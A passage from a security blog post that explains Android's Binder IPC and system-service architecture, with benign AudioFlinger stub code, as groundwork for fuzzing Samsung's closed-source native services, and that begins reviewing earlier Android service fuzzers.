<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=author content="Thalium Team"><meta name=description content="Thalium blog."><meta name=keywords content="blog,tech"><meta name=viewport content="width=device-width,minimum-scale=1,initial-scale=1"><meta name=generator content="Hugo 0.113.0"><link rel=canonical href=/posts/fuzzing-samsung-system-services/><meta property="og:title" content="The Fuzzing Guide to the Galaxy: An Attempt with Android System Services"><meta property="og:description" content="Although the Android base is open source, many different constructors customize it with their own UIs and APIs. All these additions represent an extra attack surface that can change from one phone model to another. We tried to automatically fuzz the closed-source system services powering these modifications, discovering CVE-2022-39907 and CVE-2022-39908 along the way."><meta property="og:type" content="article"><meta property="og:url" content="/posts/fuzzing-samsung-system-services/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-04-20T00:00:00+00:00"><meta property="article:modified_time" content="2023-04-20T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="The Fuzzing Guide to the Galaxy: An Attempt with Android System Services"><meta name=twitter:description content="Although the Android base is open source, many different constructors customize it with their own UIs and APIs. All these additions represent an extra attack surface that can change from one phone model to another. We tried to automatically fuzz the closed-source system services powering these modifications, discovering CVE-2022-39907 and CVE-2022-39908 along the way."><meta itemprop=name content="The Fuzzing Guide to the Galaxy: An Attempt with Android System Services"><meta itemprop=description content="Although the Android base is open source, many different constructors customize it with their own UIs and APIs. All these additions represent an extra attack surface that can change from one phone model to another. We tried to automatically fuzz the closed-source system services powering these modifications, discovering CVE-2022-39907 and CVE-2022-39908 along the way."><meta itemprop=datePublished content="2023-04-20T00:00:00+00:00"><meta itemprop=dateModified content="2023-04-20T00:00:00+00:00"><meta itemprop=wordCount content="8729"><meta itemprop=keywords content="Android,CVE,Fuzzing,Vulnerability Research,"><link rel=stylesheet href=/css/layout.css><link rel=stylesheet href=/css/default-dark.css><link rel=icon href=/favicon.ico><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-141692648-1","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script><title>The Fuzzing Guide to the Galaxy: An Attempt with Android System Services</title><script>MathJax={tex:{inlineMath:[["∳","∳"]],displayMath:[["∳∳","∳∳"]],processEscapes:!0},svg:{fontCache:"global"}}</script><script type=text/javascript id=MathJax-script async src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js></script></head><body><style>@font-face{font-family:days_one;src:url(/days_one.ttf)format('truetype')}.siteTitle{margin-top:24px}.siteTitle img{display:inline-block;vertical-align:middle;margin-top:-24px;margin-right:-10px}.siteTitle span{font-family:days_one,Fallback,sans-serif;color:#fff;font-size:160%}</style><div class=main><header><div class=header-bar><nav><div class=siteTitle><a href=/><img src=/shard_only_no_background.png width=12%></img>
<span>THALIUM</span></a></div><a class=nav-item href=/posts/><div class=nav-item-title>Posts</div></a><a class=nav-item href=/joinus/><div class=nav-item-title>Join Us</div></a><a class=nav-item href=/about/><div class=nav-item-title>About</div></a></nav><div class=social-links-header><a href=mailto:contact@thalium.re><div class=social-link>Email</div></a><a href=https://github.com/thalium target=_blank><div class=social-link>Github</div></a><a href=https://twitter.com/thalium_team target=_blank><div class=social-link>Twitter</div></a></div></div></header><article class=post><h1 class=title>The Fuzzing Guide to the Galaxy: An Attempt with Android System Services</h1><div class=content><h2 id=table-of-contents>Table of Contents</h2><ul><li><a href=#introduction>Introduction</a></li><li><a href=#system-services-on-android>System Services on Android</a><ul><li><a href=#the-binder>The Binder</a></li><li><a href=#example-of-the-audioflinger>Example of the AudioFlinger</a><ul><li><a href=#the-interface-definition>The Interface Definition</a></li><li><a href=#the-client-stub>The Client Stub</a></li><li><a href=#the-server-stub>The Server Stub</a></li><li><a href=#the-actual-service-logic>The Actual Service Logic</a></li><li><a href=#the-potential>The Potential</a></li></ul></li></ul></li><li><a href=#looking-for-a-good-attack-surface>Looking for a Good Attack Surface</a><ul><li><a href=#who>Who</a></li><li><a href=#where>Where</a></li><li><a href=#what>What</a></li></ul></li><li><a href=#approach>Approach</a><ul><li><a href=#a-review-of-existing-fuzzers>A Review of Existing Fuzzers</a></li><li><a href=#building-the-analysis>Building the Analysis</a><ul><li><a href=#the-1st-module-dynamic-search>The 1st module: Dynamic Search</a></li><li><a href=#the-2nd-module-symbolic-execution>The 2nd module: Symbolic Execution</a></li></ul></li></ul></li><li><a href=#to-the-galaxy-and-beyond>To the Galaxy, and Beyond</a><ul><li><a href=#cve-2022-39907>CVE-2022-39907</a></li><li><a href=#cve-2022-39908>CVE-2022-39908</a></li><li><a href=#responsible-disclosure>Responsible Disclosure</a></li></ul></li><li><a href=#conclusion>Conclusion</a></li></ul><h1 id=introduction>Introduction</h1><p><strong>Android</strong> is the leading OS on the international smartphone market. Its base is open source, however each manufacturer is free to apply their own customizations to it. All these additions represent an extra attack surface that can change from one phone model to another.</p><p>During my internship at <em>Thalium</em>, I looked for an efficient way to seek for vulnerabilities in highly privileged processes in Android. To that effect, I studied <strong>Binder</strong>, Android&rsquo;s <em>Inter Process Communication</em> (IPC) mechanism. It is the medium used to access <strong>system services</strong>, which are often hosted in privileged processes. It also provides a unified interface, which can therefore be conveniently used for vulnerability research through fuzzing.</p><p>Due to the sheer amount of system services on a typical phone, my goal was refined to be more specific, and I tried to specifically fuzz the closed-source native services. Those are precisely the ones added or modified by smartphone constructors. The starting point of my approach was a publication entitled <em>"<a href=https://www.usenix.org/conference/usenixsecurity20/presentation/liu>FANS: Fuzzing Android Native System Services via Automated Interface Analysis</a>"</em>, presented at <em>USENIX Security &lsquo;20</em>. It introduced FANS, an analyzer and fuzzer achieving very good results when dealing with open-source native services. I tried to adapt FANS to my target, replacing its code-driven analysis by a binary-based one.</p><p>Because knowing the ins and outs of service implementation on Android was of huge help to me, a large part of this blog post is devoted to it. I will also present a few existing fuzzers and explain why adapting FANS to binary code is an interesting idea.</p><p>The proposed method was tested on a <em>Samsung Galaxy J6</em> and led to the discovery of <a href=https://nvd.nist.gov/vuln/detail/CVE-2022-39907><code>CVE-2022-39907</code></a> and <a href=https://nvd.nist.gov/vuln/detail/CVE-2022-39908><code>CVE-2022-39908</code></a>. The end of this article is dedicated to these results.</p><h1 id=system-services-on-android>System Services on Android</h1><p>The aim of this section is to detail the architecture of a typical Android service. If you&rsquo;re already familiar with the subject you might want to <a href=#looking-for-a-good-attack-surface>skip it</a>.</p><p>All the service logic in Android comes from one principle: isolation between processes is quite strongly enforced. It is backed by many existing Linux-kernel mechanisms that are not always used in other distributions, namely users, groups, POSIX capabilities and <a href=https://source.android.com/docs/security/features/selinux>SELinux</a>. For example, an unprivileged app has no access to the drivers, yet still requires hardware or system support for most of the classic smartphone uses! An example we will study more later is the need to handle basic sound-playing tasks.</p><p>Like for many operating systems, the Android team engineered a dedicated mechanism to handle services. It is named <strong>Binder</strong>. With its support, the services can be seen as bucks of <em>Inter-Process Communications</em> (IPC) exposed by privileged processes. If you have already developed for Android, then you have used this feature through the <a href=https://developer.android.com/guide/platform>Android Framework</a>, which is actually partly the system services, disguised under the cloak of a convenient and standardized API.</p><p><figure style=margin-top:1em;margin-bottom:1em><a href=/posts/img/samsung-system-services/architecture_simple.png target=_blank><img src=/posts/img/samsung-system-services/architecture_simple.png alt="A simple architectural view of Android"></a><figcaption style=font-weight:400;font-style:italic;margin-top:1em>Binder is a common interface between many kinds of processes that may live in different SELinux Domains.</figcaption></figure></p><h2 id=the-binder>The Binder</h2><p>The IPCs for the system services work through Binder with a very standardized procedure:</p><ul><li>Each call is labelled as a <strong>transaction</strong>, identified by a number inside a group termed an <strong>interface</strong>.</li><li>During a transaction, the queried process can be viewed as a server. It has previously registered a <strong>node</strong> for each instance of any interface it exposes. On the other side, the calling process can be viewed as a client. It has obtained a <strong>reference</strong> on the target node beforehand.</li><li>The content of a transaction is marshalled into a <a href=https://developer.android.com/reference/android/os/Parcel><strong>Parcel</strong></a>. This means that in the client process, the transaction call is preceded by some serialization code. On the contrary, the server process starts its part of the transaction with deserialization.</li></ul><p>So how does this all work in practice? This Binder mechanism is actually enabled by both stubs (in user-space) and a driver (in kernel-space). The stubs handle the communication and serialization tasks in both the client & server, while the job of the driver is mainly twofold:</p><ul><li>It enables the transmissions between processes. Each of them interacts with a pseudo-device, usually <code>/dev/binder</code>, which is accessible within their isolation bounds.</li><li>It does some bookkeeping of the nodes and references we evoked, for each process.</li></ul><p><figure style=margin-top:1em;margin-bottom:1em><a href=/posts/img/samsung-system-services/ipc.png target=_blank><img src=/posts/img/samsung-system-services/ipc.png alt="A service IPC"></a><figcaption style=font-weight:400;font-style:italic;margin-top:1em>Cross-boundary communication between processes, going through the Binder driver.</figcaption></figure></p><p>From this perspective, it seems that Binder could be a handy point of access to fuzz various system services at once. Investigating its inner workings and ensuring it is secure would be another interesting approach (and it was indeed studied before by others). Here, our goal is to play with the system services only, thus we assume Binder is secure and leave it out-of-scope.</p><h2 id=example-of-the-audioflinger>Example of the AudioFlinger</h2><p>Now that we have an idea of how the Binder works, we shall move on to the implementation of a service. A developer that wants to expose one has to spawn a few classes that are backed by multiple parent classes from the <strong>libbinder</strong> library. Inheriting these will add the standard Binder stubs to the newly written service. Let&rsquo;s follow an example from the <code>IAudioFlinger</code> interface (an audio service that can be seen as the equivalent of <code>pulseaudio</code> from desktop Linux), to understand the purpose of these classes. We will observe the <code>masterMute()</code> transaction, which solely returns a boolean indicating whether the master audio is muted.</p><p><figure style=margin-top:1em;margin-bottom:1em><a href=/posts/img/samsung-system-services/implementation.png target=_blank><img src=/posts/img/samsung-system-services/implementation.png alt="An implementation of the Audio Flinger"></a><figcaption style=font-weight:400;font-style:italic;margin-top:1em>The different classes composing the Audio Flinger (in italic), and their parents from <code>libbinder</code>.<br>Note that in order to handle the service node/reference behavior, the interfaces are built on top of the Android smart pointer mechanism, thanks to the <code>RefBase</code> class.</figcaption></figure></p><h3 id=the-interface-definition>The Interface Definition</h3><p>The interface <code>IAudioFlinger</code> is an abstract class defining the available transactions, solely <code>masterMute()</code> in the present case. It is the only class a normal client should be directly manipulating. Its design is intended to allow the same usage from within the service host process and any other process: the exposed virtual function <code>IAudioFlinger::masterMute()</code> will directly be derived as the service <code>AudioFlinger::masterMute()</code> on the host process, skipping the Binder communications. On any other process it will instead be derived as the appropriate stub <code>BpAudioFlinger::masterMute()</code>. This behaviour is very useful since it is classic to regroup many services in a same process for performance and convenience, but the bundling usually varies from one model of smartphone to another.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>// IAudioFlinger.h
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>IAudioFlinger</span> <span style=color:#f92672>:</span> <span style=color:#66d9ef>public</span> IInterface
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>public</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>    DECLARE_META_INTERFACE(AudioFlinger);
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Virtual declaration of the transaction
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>virtual</span> <span style=color:#66d9ef>bool</span> <span style=color:#a6e22e>masterMute</span>() <span style=color:#66d9ef>const</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#75715e>// [...]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
</span></span></code></pre></div><p>Each interface also has an identifier, known as the <strong>interface descriptor</strong>. Here it&rsquo;s <code>android.media.IAudioFlinger</code>. It is commonly used as the first argument for each transaction of the designated interface.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>// IAudioFlinger.cpp
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>IMPLEMENT_META_INTERFACE(
</span></span><span style=display:flex><span>  AudioFlinger,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#34;android.media.IAudioFlinger&#34;</span>
</span></span><span style=display:flex><span>);
</span></span></code></pre></div><h3 id=the-client-stub>The Client Stub</h3><p>The client stub <code>BpAudioFlinger</code> - where <code>Bp</code> stands for Binder proxy - starts by serializing the transaction input data (only the interface descriptor in our case) into the <code>data</code> Parcel. A reference to the remote service node must already be owned by the current process. It is retrieved via <code>remote()</code> and used to perform the service call. The chosen transaction is indicated by its number in the interface (here, <code>MASTER_MUTE</code>). The <code>transact()</code> function handles the low-level interactions with the Binder driver and ends synchronously after the server process executed the transaction. Finally, the output data is deserialized from the <code>reply</code> Parcel.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>// IAudioFlinger.cpp
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>BpAudioFlinger</span> <span style=color:#f92672>:</span> <span style=color:#66d9ef>public</span> BpInterface<span style=color:#f92672>&lt;</span>IAudioFlinger<span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>public</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>virtual</span> <span style=color:#66d9ef>bool</span> masterMute() <span style=color:#66d9ef>const</span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      <span style=color:#75715e>// Parcels for marshalling the arguments and the responses
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      Parcel data, reply;
</span></span><span style=display:flex><span>      <span style=color:#75715e>// Serialization of the transaction argument
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      <span style=color:#75715e>// (Here only the interface descriptor)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      data.writeInterfaceToken(IAudioFlinger<span style=color:#f92672>::</span>getInterfaceDescriptor());
</span></span><span style=display:flex><span>      <span style=color:#75715e>// Reference retrieving and remote call with the transaction code
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      remote()<span style=color:#f92672>-&gt;</span>transact(MASTER_MUTE, data, <span style=color:#f92672>&amp;</span>reply);
</span></span><span style=display:flex><span>      <span style=color:#75715e>// Deserialization of the response
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      <span style=color:#66d9ef>return</span> reply.readInt32();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#75715e>// [...]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
</span></span></code></pre></div><h3 id=the-server-stub>The Server Stub</h3><p>The server stub <code>BnAudioFlinger</code> - where <code>Bn</code> stands for Binder native - is made of the <code>onTransact()</code> member function. It is automatically started by the Binder driver after a client calls <code>transact()</code>. For this purpose, the Binder maintains a <strong>thread pool</strong> on each process that host services. This function has a big <code>switch</code> structure in order to handle every possible transaction code. For each of them, it deserializes the input data, calls the service and serializes the response. It also often performs various sanity checks on the input data format. In the instance below, <code>CHECK_INTERFACE</code> is a macro hiding the deserialization and verification of the descriptor. Then, <code>IAudioFlinger:masterMute()</code> is used to call the service. It returns an <code>int32_t</code> indicating if the master audio is muted, which is finally serialized in the reply parcel. The transaction ends on the server part by returning a status code.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>// IAudioFlinger.cpp
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>status_t BnAudioFlinger<span style=color:#f92672>::</span>onTransact(
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>uint32_t</span> code, <span style=color:#66d9ef>const</span> Parcel<span style=color:#f92672>&amp;</span> data, Parcel<span style=color:#f92672>*</span> reply, <span style=color:#66d9ef>uint32_t</span> flags)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>switch</span> (code) {
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Switch on transaction code
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>case</span> MASTER_MUTE: {
</span></span><span style=display:flex><span>      <span style=color:#75715e>// Deserialization of the argument and checks
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      CHECK_INTERFACE(IAudioFlinger, data, reply);
</span></span><span style=display:flex><span>      <span style=color:#75715e>// Service call and serialization of the response
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      reply<span style=color:#f92672>-&gt;</span>writeInt32( masterMute() );
</span></span><span style=display:flex><span>      <span style=color:#75715e>// Status code
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      <span style=color:#66d9ef>return</span> NO_ERROR;
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>    <span style=color:#75715e>// [...]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h3 id=the-actual-service-logic>The Actual Service Logic</h3><p>The real implementation for the service features lies in the service class <code>AudioFlinger</code>. Since <code>AudioFlinger</code> notably inherits code from <code>IAudioFlinger</code>, in practice the host process only has to start an instance of <code>AudioFlinger</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>// AudioFlinger.cpp
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>bool</span> AudioFlinger<span style=color:#f92672>::</span>masterMute() <span style=color:#66d9ef>const</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  Mutex<span style=color:#f92672>::</span>Autolock _l(mLock);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>masterMute_l</span>();
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>bool</span> AudioFlinger<span style=color:#f92672>::</span>masterMute_l() <span style=color:#66d9ef>const</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#75715e>// Here the service only has to return information about its internal state
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>return</span> mMasterMute;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h3 id=the-potential>The Potential</h3><p>So why did we go through all this lengthy explanation? As illustrated below, we learned that a typical service call will go through a series of formalized steps&mldr; <strong>and all these form an outstanding opportunity to gather info</strong>! We can get the arguments, the serialization format and the conditions of each transaction to be fuzzed. Plus, due to the very deterministic aspect of the Binder stubs, it is easier to perform a static analysis, and consequently we can consider automating such an analysis at the scale of all the different system services.</p><p><figure style=margin-top:1em;margin-bottom:1em><a href=/posts/img/samsung-system-services/call.png target=_blank><img src=/posts/img/samsung-system-services/call.png alt="A call to <code>masterMute()</code>"></a><figcaption style=font-weight:400;font-style:italic;margin-top:1em>The <code>masterMute()</code> transaction going through the standard Binder stubs.</figcaption></figure></p><p>Depending on the desired approach, one can choose to manipulate any of the introduced classes:</p><ul><li>The interface is easy to use and its study provides the most high-level information such as the type of each transaction parameter.</li><li>The investigation of the client and server (de-)serialization stubs informs about the fine-grained data types that are manipulated by the Binder. In addition, the server part provides some constraints that are enforced on the parameters.</li><li>When feasible, directly analyzing the service will produce the most precise results. Yet it is a harder task, since its code is not standardized.</li></ul><h1 id=looking-for-a-good-attack-surface>Looking for a Good Attack Surface</h1><p>At this point, we have identified a way to gather format information (the consistent stubs) and a common entry point (the Binder). However, system services &ldquo;in the wild&rdquo; are not that uniform, and since the subtle differences introduce difficulties for fuzzing, it would be better to know them in order to fuzz them in a &ldquo;clever&rdquo; way.</p><p>The services especially tend to diverge in:</p><ul><li>Who they are: how they are implemented and organized.</li><li>Where to access them: how to acquire a <em>Binder</em> reference to interact with them.</li><li>What they manipulate: whether they need specific arguments and how to get them.</li></ul><p>In this section we&rsquo;re going through a panorama of the disparities along these 3 axes!</p><h2 id=who>Who</h2><p>The services are not all built the same way.</p><p>Their first point of difference is their origin:</p><ul><li>The vast majority comes from the Android base, <a href=https://source.android.com><em>Android Open Source Platform</em> (AOSP)</a>, therefore their code is freely available.</li><li>Some are customizations added by the constructors, and are usually closed-source.</li><li>Some are originally from AOSP, but were modified by the constructor. Generally, they are extended with new transactions, which like fully new services, are closed-source.</li><li>Developers also have the ability to push services within their apps. In this case, we won&rsquo;t talk about <em>system</em> services but they are nonetheless built and made available with similar methods.</li></ul><p>The second point is the variety of languages used to program the services. Plus, the interface and stubs presented in the previous section are not always written &ldquo;by hand&rdquo;. Android has its own <em>Interface Definition Language</em> (IDL), surprisingly named AIDL for <em>Android IDL</em>! Developers can use it to describe a service and its transaction, then the code is automatically generated through the backend of their language of choice. To this day, there are:</p><ul><li>2 C++ backends: one for AOSP/system and one for <a href=https://developer.android.com/><em>Native Development Kit</em> (NDK)</a>/app services.</li><li>A Java backend.</li><li><a href=https://security.googleblog.com/2021/04/rust-in-android-platform.html>Since Snow Cone</a>, a Rust backend.</li></ul><p><figure style=margin-top:1em;margin-bottom:1em><a href=/posts/img/samsung-system-services/aidl.png target=_blank><img src=/posts/img/samsung-system-services/aidl.png alt="An AIDL implementation of the Audio Flinger"></a><figcaption style=font-weight:400;font-style:italic;margin-top:1em>The Binder stub classes of the Audio Flinger could have been generated through AIDL.</figcaption></figure></p><p>Some static analysis methods take advantage of the source code, and naturally won&rsquo;t be universally applicable here.</p><p>These two points also introduce another difficulty by impacting the location of the files for a given service. They are indeed dispersed amid the AOSP source, among the build files (for the classes generated with AIDL), and in the compiled libraries. Android possesses a complex build system and directory tree, and the code for the various services can be all over the place. Sometimes a service is also duplicated for use in several languages (or accompanied by a <em>Java Native Interface</em> (JNI) bridge for that purpose). Therefore if we want to gather format information from these files, it is first necessary to have a method to find them!</p><p><figure style=margin-top:1em;margin-bottom:1em><a href=/posts/img/samsung-system-services/files.png target=_blank><img src=/posts/img/samsung-system-services/files.png alt="An overview of <code>AppOpsService</code> files"></a><figcaption style=font-weight:400;font-style:italic;margin-top:1em><code>AppOpsService</code> is a good example of a system service with scattered files.<br>The service logic is implemented in <code>AppOpsService.java</code>, it has a C++ interface with <code>IAppOpsService.cpp</code>, but also a Java one <code>IAppOpsService.java</code>. The latter is generated automatically from <code>IAppOpsService.aidl</code>.</figcaption></figure></p><h2 id=where>Where</h2><p>In order to fuzz a service, you need to be able to call this service. Yet as detailed above, you need to get an interface reference beforehand.</p><p>The first thing to know is that it is possible to pass references to services alongside marshalled data in a Parcel. This means the usual way to retrieve a reference is simply to get it through the response of another transaction! Nice, now this is a Chicken-and-Egg problem&mldr; Luckily, to start the chain, there is a special system service called the <code>ServiceManager</code>, and every process automatically possesses a reference on it. Other services can register so that any process can ask the <code>ServiceManager</code> for a reference to them. The involved process is illustrated below. Such services are therefore easily available and we can refer to them as <strong>top level services</strong>.</p><p><figure style=margin-top:1em;margin-bottom:1em><a href=/posts/img/samsung-system-services/ref_1.png target=_blank><img src=/posts/img/samsung-system-services/ref_1.png alt="Communication with a top level service - Step 1"></a><figcaption style=font-weight:400;font-style:italic;margin-top:1em>1 - Using the transactions exposed by the <code>ServiceManager</code>, the top level service <code>MyService</code> can register by offering a reference to itself as an argument.</figcaption></figure><figure style=margin-top:1em;margin-bottom:1em><a href=/posts/img/samsung-system-services/ref_2.png target=_blank><img src=/posts/img/samsung-system-services/ref_2.png alt="Communication with a top level service - Step 2"></a><figcaption style=font-weight:400;font-style:italic;margin-top:1em>2 - The <code>ServiceManager</code> keeps the reference to <code>MyService</code>, through another transaction a client is able to get it as a response.</figcaption></figure><figure style=margin-top:1em;margin-bottom:1em><a href=/posts/img/samsung-system-services/ref_3.png target=_blank><img src=/posts/img/samsung-system-services/ref_3.png alt="Communication with a top level service - Step 3"></a><figcaption style=font-weight:400;font-style:italic;margin-top:1em>3 - Now that both processes have matching node and reference, it is possible for the client to call the instance <code>MyService</code> hosted in this particular server.</figcaption></figure></p><p>On the opposite, there are <strong>nested services</strong> which do not register themselves to the <code>ServiceManager</code>. It may be possible to get a handle on them by talking to some top level service. And the chain goes on, onto <em>deeper</em> services. The services that can be bundled within apps are an example of such nested services: they are registered to the <code>ActivityManager</code> which is itself a top level service.</p><p><figure style=margin-top:1em;margin-bottom:1em><a href=/posts/img/samsung-system-services/app.png target=_blank><img src=/posts/img/samsung-system-services/app.png alt="Communication with an app service"></a><figcaption style=font-weight:400;font-style:italic;margin-top:1em>Two preparative steps are required to start a transaction with an app service.</figcaption></figure></p><p>The second thing is that sometimes services are not even initially accessible! This is actually quite a mess, and may happen because:</p><ul><li>Some are launched on-demand by calling a transaction in another service. It can be the case even for some top level services.</li><li>Some are mass-created by their parent service. For example the <code>AudioFlinger</code> has a <code>createTrack()</code> transaction which will create a new <code>AudioTrack</code> service for each track.</li><li>Some services are only meant to be hosted by a process client to another service. This is the Binder way to create a listener or a callback.</li></ul><p>The third thing is that there are, in fact, several instances of the Binder in a typical Android device&mldr; It is the result of <em>project Treble</em>, a major Android update which introduced deep changes in the architecture of the OS since Oreo. The new architecture looks like this:</p><p><figure style=margin-top:1em;margin-bottom:1em><a href=/posts/img/samsung-system-services/architecture_treble.png target=_blank><img src=/posts/img/samsung-system-services/architecture_treble.png alt="An architectural view of Android since Treble"></a><figcaption style=font-weight:400;font-style:italic;margin-top:1em>More SELinux and more Binder, Yeah!</figcaption></figure></p><p><a href=https://android-developers.googleblog.com/2017/05/here-comes-treble-modular-base-for.html>The goal of Treble</a> was to make it easier for manufacturers to update Android, by making the system services hardware-agnostic and accordingly not directly interacting with drivers anymore. It introduced a new kind of &ldquo;service&rdquo; to deal with the drivers, the <em>Hardware Abstraction Layers</em> (HAL). They are provided by the constructors, and they expose a more constant interface than the &ldquo;classic&rdquo; services, so that all the upper layer of Android could be replaced without the need to rework the HALs and drivers. To enable all the new communications the Binder is now instanced many times in dedicated pseudo-devices, each with its own <code>ServiceManager</code> and its own set of services. The most common configuration involves 3 devices:</p><ul><li><code>/dev/binder</code> the &ldquo;classic&rdquo; Binder. It handles the communication between the apps, the app services and the system services.</li><li><code>/dev/vndbinder</code> the &ldquo;vendor&rdquo; Binder. It handles the communication between the HALs.</li><li><code>/dev/hwbinder</code> the &ldquo;hardware&rdquo; Binder. It handles the communication between the system services and the HALs. Its implementation differs a little from the other two.</li></ul><p>However it is still possible (and done in practice) for the manufacturers to add and modify the system services, for example in order to make a special feature of their camera available to any app.</p><p>Since an unprivileged process will usually interact only with <code>/dev/binder</code>, we left the other binders out-of-scope for this article.</p><h2 id=what>What</h2><p>The Parcel format used by the Binder is used to transfer complex data.</p><p>The first complexity arises because it is a very simple format: all the types are encoded as raw data aligned on 4 bytes, without any indication or metadata. This is one of the reasons why each service must reimplement the (de-)serialization stubs: to read or write transaction data from a Parcel you need to know in advance the number, order and type of each recorded value. The same is true for a fuzzer sending Parcels to a service, so this is also the reason why it can prove hard to fuzz without a previous analysis!</p><p>The second complexity comes from the need for transactions to not only transfer basic low-level data, but also complex objects such as:</p><ul><li><em>File descriptors</em>. Binder intervenes so that they keep a meaning from one process to another.</li><li><em>Custom objects</em>. Those must be of a class defined as children of the <code>Parcelable</code> class or implementing the legacy <code>Flattenable</code>/<code>LightFlattenable</code> protocol. These classes expose standard functions that serialize these objects down into low-level elements. A potential analyzer may need to take this into account in order to recreate these custom objects when fuzzing.</li><li><em>Service references</em>, as previously discussed. There are deep dependencies between services, and a fuzzer may have to interact with other services or expose some itself before being able to call a transaction.</li></ul><p><figure style=margin-top:1em;margin-bottom:1em><a href=/posts/img/samsung-system-services/dependencies.png target=_blank><img src=/posts/img/samsung-system-services/dependencies.png alt="Dependencies of <code>IAudioFlinger</code>"></a><figcaption style=font-weight:400;font-style:italic;margin-top:1em>Some transactions of <code>IAudioFlinger</code> ask for references to an <code>IAudioFlingerClient</code> or an <code>IEffectClient</code> as arguments.<br>Some transactions give references to an <code>IAudioTrack</code>, an <code>IEffect</code> or an <code>IAudioRecord</code> in the responses.</figcaption></figure></p><p>The issues coming from such interactions with marshalled data may be prevented by working at the interface-level, but then you will have to generate transaction parameters with a lot of various high-level types.</p><h1 id=approach>Approach</h1><p>So now we know a lot more about the system services, about why it would be great to fuzz&rsquo;em all, but all this comes with its fair share of problems. But we are naturally (and fortunately!) not the first ones interested in the automated fuzzing of Android system services. The mechanisms and difficulties we listed are already known in the cybersecurity literature, so it is logical for us to start our approach by reviewing how 3 previous custom fuzzers worked on the subject.</p><h2 id=a-review-of-existing-fuzzers>A Review of Existing Fuzzers</h2><p><a href=https://doi.org/10.1145/2991079.2991120><strong>Binder Cracker</strong></a> uses a modified Android OS, where the serialization and deserialization processes that happened in the Binder stub are instrumented. This way, it collects the format and the order of every transaction happening. After this collection phase comes the fuzzing, which is done by reenacting the recorded transactions with mutated arguments. In order to feed the acquisition, a variety of top-used Android applications are installed on the tweaked phone and are actively used.</p><p>This approach is &ldquo;simple&rdquo; yet powerful, as by reusing the transactions in the same order, problems like dependencies between services are quickly solved. Nonetheless, it has a major flaw: it cannot be exhaustive. In particular, transactions that are rarely played have a high chance of not being present in the initial set of apps, and therefore won&rsquo;t be fuzzed even though they are infrequent high-value targets. Binder Cracker&rsquo;s code is unfortunately not available publicly.</p><p><a href=https://doi.org/10.1109/ISSRE.2017.16><strong>Chizpurfle</strong></a> takes advantage of the Java <strong>Reflection API</strong>. The latter is a nice feature of the Java language 